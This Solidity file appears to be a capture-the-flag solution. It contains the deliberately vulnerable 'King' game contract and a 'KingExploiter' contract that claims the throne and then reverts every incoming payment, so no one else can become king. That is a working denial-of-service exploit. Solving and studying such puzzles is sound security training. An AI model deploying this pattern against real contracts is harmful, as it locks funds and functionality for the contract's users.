// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract KingExploiter {
    address public owner;
    King game;

    constructor(King _game) public payable {
        owner = msg.sender;
        game = _game;
    }

    function becomeKing() external payable {
        (bool success, ) = payable(address(game)).call.value(2000000000000000)("");
        require(success, "Failed to send ETH to King game");
    }

    receive() external payable {
        require(false, "Forever king!");
    }
}
